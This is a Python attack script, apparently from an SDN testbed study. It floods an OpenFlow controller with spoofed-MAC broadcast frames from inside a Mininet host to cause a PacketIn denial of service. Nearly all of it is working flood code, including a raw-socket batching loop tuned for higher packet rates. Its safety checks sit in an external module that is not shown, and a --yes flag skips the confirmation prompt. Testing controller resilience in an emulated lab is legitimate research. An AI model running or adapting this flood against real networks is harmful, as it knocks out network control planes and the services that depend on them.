#!/usr/bin/env python3
"""
attacks/packetin_flood.py
--------------------------
Phase 5 — Attack Module 1: PacketIn Flood (North-South)

Strategy
────────
This script is launched FROM INSIDE a Mininet host's network namespace
(e.g. via net.get('h1').cmd('python3 attacks/packetin_flood.py ...')
or by running it directly inside the namespace).

It uses Scapy to craft Ethernet/IP frames with spoofed, randomised source
MACs and IPs.  Because the switch's flow-table will have no entry for each
novel spoofed source, every single packet triggers a PACKET_IN event to the
domain controller — saturating the control channel (OpenFlow TCP socket) and
the controller's CPU with table-miss processing.

Safety harness
──────────────
  1. validate_target()     — refuses any IP outside 10.0.0.0/24
  2. confirm_before_run()  — interactive yes/no gate
  3. safe_rate_ramp()      — starts at START_RATE pkt/s, ramps to MAX_RATE
  4. start_watchdog()      — kills the process if it outlives MAX_DURATION

Run example (from the Mininet host namespace, e.g. h1):
    python3 attacks/packetin_flood.py \
        --target 10.0.0.9 \
        --iface h1-eth0 \
        --start-rate 500 \
        --max-rate 5000 \
        --step 500 \
        --duration 120
"""

from __future__ import annotations

import argparse
import logging
import os
import sys
import time
from datetime import datetime, timezone

# ── Project path ──────────────────────────────────────────────────────────────
_HERE = os.path.dirname(os.path.abspath(__file__))
_ROOT = os.path.dirname(_HERE)
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from attacks.safety import (
    validate_target,
    confirm_before_run,
    safe_rate_ramp,
    start_watchdog,
    ALLOWED_SUBNET,
)

# ── Logging ───────────────────────────────────────────────────────────────────
RESULTS_DIR = os.path.join(_ROOT, "results")
os.makedirs(RESULTS_DIR, exist_ok=True)

_ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
LOG_FILE = os.path.join(RESULTS_DIR, f"attack_packetin_{_ts}.log")

_fmt = logging.Formatter(
    "%(asctime)s  %(levelname)-8s  %(message)s", datefmt="%Y-%m-%dT%H:%M:%S"
)
_fh = logging.FileHandler(LOG_FILE, mode="w", encoding="utf-8")
_sh = logging.StreamHandler(sys.stdout)
for _h in (_fh, _sh):
    _h.setFormatter(_fmt)

log = logging.getLogger("packetin_flood")
log.setLevel(logging.DEBUG)
log.propagate = False
log.addHandler(_fh)
log.addHandler(_sh)

# ── Attack defaults ───────────────────────────────────────────────────────────
DEFAULT_TARGET     = "10.0.0.9"   # default victim IP (Mininet only)
DEFAULT_IFACE      = "h1-eth0"    # must be a Mininet interface
DEFAULT_START_RATE = 500           # pkt/s
DEFAULT_MAX_RATE   = 5000          # pkt/s — escalated from 500; earlier runs at 300
                                    # showed <12% latency delta (within jitter);
                                    # higher rates needed to find controller saturation point
DEFAULT_STEP       = 500           # pkt/s increase per ramp step
DEFAULT_RAMP_INTER = 10.0          # seconds between ramp steps
DEFAULT_DURATION   = 120           # seconds (hard maximum: 600s via watchdog)
TARGET_CONTROLLER  = "Domain-A controller (port 6633)"


# ── Flood implementation ──────────────────────────────────────────────────────

def _random_mac() -> str:
    """Return a random locally-administered unicast MAC."""
    import random
    mac = [random.randint(0, 255) for _ in range(6)]
    mac[0] = (mac[0] & 0xFE) | 0x02   # locally administered, unicast
    return ":".join(f"{b:02x}" for b in mac)


def _random_ip_in_subnet() -> str:
    """Return a random 10.0.0.x address (x in 1-254)."""
    import random
    return f"10.0.0.{random.randint(1, 254)}"


def _build_packet(dst_ip: str):
    """Craft one spoofed Ethernet/IP packet with a random src MAC and src IP."""
    from scapy.all import Ether, IP, UDP, Raw  # type: ignore[import]
    src_mac = _random_mac()
    src_ip  = _random_ip_in_subnet()
    pkt = (
        Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src=src_ip, dst=dst_ip, ttl=64)
        / UDP(sport=12345, dport=9)
        / Raw(load=b"FLOOD")
    )
    return pkt


def _build_template_packet(dst_ip: str) -> bytearray:
    """Build a single raw template packet to bypass Scapy overhead."""
    log.info("Pre-building packet template...")
    return bytearray(bytes(_build_packet(dst_ip)))


def run_flood(target_ip: str, iface: str, rate_state: dict,
              stop_event, counters: dict) -> None:
    """Send spoofed packets at a dynamic rate until stop_event is set.

    Uses an AF_PACKET raw socket and batched sending to bypass Python's
    per-packet overhead and time.sleep() resolution limits, allowing us
    to actually hit 5,000+ pkt/s.
    """
    import socket
    import os
    
    # 1. Pre-build template
    template = _build_template_packet(target_ip)
    
    # 2. Open raw socket
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        s.bind((iface, 0))
    except Exception as exc:
        log.error("Failed to open raw socket on %s: %s", iface, exc)
        counters['errors'] += 1
        return

    # 3. Batched send loop
    batch_interval = 0.05  # Wake up 20 times per second
    next_wakeup = time.time()

    while not stop_event.is_set():
        now = time.time()
        # Prevent huge bursts if we fell behind (e.g. CPU stalled)
        if now > next_wakeup + 0.5:
            next_wakeup = now

        rate = rate_state.get('rate', 500)
        # Calculate how many packets to send in this 50ms batch
        pkts_to_send = max(1, int(rate * batch_interval))

        try:
            for _ in range(pkts_to_send):
                # Mutate the source MAC (bytes 6-11) inline for infinite entropy
                rand_mac = bytearray(os.urandom(6))
                rand_mac[0] &= 0xfe  # Ensure unicast (clear multicast bit)
                template[6:12] = rand_mac
                
                s.send(template)
                counters['sent'] += 1
        except Exception as exc:
            counters['errors'] += 1
            log.error("socket.send error: %s", exc)
            time.sleep(0.5)
            next_wakeup = time.time()
            continue

        next_wakeup += batch_interval
        sleep_time = next_wakeup - time.time()
        if sleep_time > 0:
            time.sleep(sleep_time)


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> int:
    parser = argparse.ArgumentParser(
        description=(
            "PacketIn flood — spoof random MACs/IPs toward a Mininet host to "
            "saturate the controller's control channel.  MUST run inside the "
            "Mininet host's network namespace."
        )
    )
    parser.add_argument("--target",     default=DEFAULT_TARGET,
                        help=f"Victim IP address (must be in {ALLOWED_SUBNET})")
    parser.add_argument("--iface",      default=DEFAULT_IFACE,
                        help="Mininet host network interface (e.g. h1-eth0)")
    parser.add_argument("--start-rate", type=int, default=DEFAULT_START_RATE,
                        help="Initial packet rate (pkt/s)")
    parser.add_argument("--max-rate",   type=int, default=DEFAULT_MAX_RATE,
                        help="Maximum packet rate (pkt/s)")
    parser.add_argument("--step",       type=int, default=DEFAULT_STEP,
                        help="Rate increment per ramp step (pkt/s)")
    parser.add_argument("--ramp-interval", type=float, default=DEFAULT_RAMP_INTER,
                        help="Seconds to hold each rate before stepping up")
    parser.add_argument("--duration",   type=int, default=DEFAULT_DURATION,
                        help="Hard upper bound on attack duration (seconds, max 600)")
    parser.add_argument("--yes",        action="store_true",
                        help="Bypass interactive confirmation")
    args = parser.parse_args()

    target   = args.target
    iface    = args.iface
    duration = args.duration

    # ── Safety gate 1: validate target ───────────────────────────────────────
    log.info("Validating target IP: %s", target)
    try:
        validate_target(target)
        validate_target(iface)          # also validate the interface name
    except Exception as exc:
        log.error("SAFETY VIOLATION — %s", exc)
        print(f"\n[BLOCKED] {exc}", file=sys.stderr)
        return 2

    # ── Safety gate 2: interactive confirmation ───────────────────────────────
    confirmed = confirm_before_run(
        attack_name="PacketIn Flood (North-South)",
        target=f"{target} via {iface} → {TARGET_CONTROLLER}",
        rate=f"{args.start_rate}–{args.max_rate} pkt/s (ramped)",
        duration=duration,
        auto_confirm=args.yes,
    )
    if not confirmed:
        log.info("User aborted. No traffic sent.")
        return 0

    # ── Safety gate 3: watchdog ───────────────────────────────────────────────
    watchdog = start_watchdog(duration)
    log.info("Watchdog armed for %d seconds.", duration)

    # ── Early import check — fail fast and visibly if scapy is missing ───────
    # Without this, the ImportError happens silently inside a daemon thread,
    # main() exits rc=0, and zero packets were ever sent.
    import sys
    # Add user's site-packages to path so root (Mininet) can find scapy installed via pip
    user_site_packages = "/home/a-anuj/.local/lib/python3.14/site-packages"
    if user_site_packages not in sys.path:
        sys.path.append(user_site_packages)
        
    try:
        from scapy.all import Ether, IP, UDP, Raw, sendp  # noqa: F401
        log.info("scapy import OK")
    except ImportError as exc:
        log.error("DEPENDENCY ERROR: scapy not available — %s", exc)
        log.error("Install with: pip3 install scapy --break-system-packages")
        return 3

    # ── Attack start ──────────────────────────────────────────────────────────
    import threading
    stop_event = threading.Event()
    attack_start = datetime.now(timezone.utc).isoformat()
    # Per-step and total counters (plain dicts; GIL makes int ops safe enough here)
    step_counters: list[dict] = []
    total_sent   = 0
    total_errors = 0
    log.info("=" * 60)
    log.info("ATTACK START  %s", attack_start)
    log.info("  Target IP       : %s", target)
    log.info("  Interface       : %s", iface)
    log.info("  Target ctrl     : %s", TARGET_CONTROLLER)
    log.info("  Rate ramp       : %d → %d pkt/s  step=%d  interval=%.1fs",
             args.start_rate, args.max_rate, args.step, args.ramp_interval)
    log.info("  Max duration    : %d s", duration)
    log.info("  Log file        : %s", LOG_FILE)
    log.info("=" * 60)

    flood_thread = None
    rate_state = {'rate': float(args.start_rate)}
    # Use a single cumulative counter dict since we now use a single thread
    cumulative_counters: dict = {'sent': 0, 'errors': 0}
    
    try:
        # Start the single flood thread
        flood_thread = threading.Thread(
            target=run_flood,
            args=(target, iface, rate_state, stop_event, cumulative_counters),
            daemon=True,
            name="flood-worker",
        )
        flood_thread.start()
        log.info("  single flood thread started (target=%s, iface=%s)", target, iface)

        for rate in safe_rate_ramp(
            start_rate=float(args.start_rate),
            max_rate=float(args.max_rate),
            step=float(args.step),
            interval=args.ramp_interval,
        ):
            active_threads = threading.active_count()
            log.info("RAMP STEP — setting rate to %.0f pkt/s  (active threads: %d)",
                     rate, active_threads)
            
            rate_state['rate'] = rate
            
            # Record a snapshot of counters for this step
            step_counters.append({
                'rate': rate,
                'sent': cumulative_counters['sent'],
                'errors': cumulative_counters['errors']
            })
            
            # Print an explicit achieved vs configured comparison to catch bottlenecks
            if len(step_counters) >= 2:
                prev = step_counters[-2]
                curr = step_counters[-1]
                pkts_this_step = curr['sent'] - prev['sent']
                actual_rate = pkts_this_step / args.ramp_interval
                log.info("  -> Step %.0f pkt/s achieved: %.1f pkt/s (%d pkts sent in %.1fs)", 
                         prev['rate'], actual_rate, pkts_this_step, args.ramp_interval)

        # Hold at max rate until duration expires or watchdog fires
        remaining = duration - args.ramp_interval * (
            (args.max_rate - args.start_rate) // max(args.step, 1) + 1
        )
        remaining = max(remaining, 0)
        if remaining > 0:
            log.info("Holding max rate %.0f pkt/s for %.0f more seconds.",
                     args.max_rate, remaining)
            time.sleep(remaining)

    except KeyboardInterrupt:
        log.info("Keyboard interrupt — stopping flood.")
    finally:
        stop_event.set()
        if flood_thread and flood_thread.is_alive():
            flood_thread.join(timeout=5)
        watchdog.cancel()

        # Tally totals
        total_sent   = cumulative_counters['sent']
        total_errors = cumulative_counters['errors']

        attack_stop = datetime.now(timezone.utc).isoformat()
        log.info("=" * 60)
        log.info("ATTACK STOP   %s", attack_stop)
        log.info("  Target IP       : %s", target)
        log.info("  Interface       : %s", iface)
        log.info("  Rate ramp       : %d → %d pkt/s  step=%d",
                 args.start_rate, args.max_rate, args.step)
        log.info("  Steps run       : %d", len(step_counters))
        log.info("  Total sent      : %d packets", total_sent)
        log.info("  Total errors    : %d", total_errors)
        log.info("  Active threads  : %d", threading.active_count())
        if total_sent == 0 and step_counters:
            log.error("  *** WARNING: ZERO packets sent — check scapy/interface. ***")
        
        # Display marginal sent packets per step
        prev_sent = 0
        prev_err = 0
        for sc in step_counters:
            marginal_sent = sc['sent'] - prev_sent
            marginal_err = sc['errors'] - prev_err
            log.info("    rate=%-6.0f  sent=%-8d  errors=%d (cumulative: %d)",
                     sc['rate'], marginal_sent, marginal_err, sc['sent'])
            prev_sent = sc['sent']
            prev_err = sc['errors']
        log.info("  Log file        : %s", LOG_FILE)
        log.info("=" * 60)

    return 0 if total_errors == 0 else 1


if __name__ == "__main__":
    raise SystemExit(main())
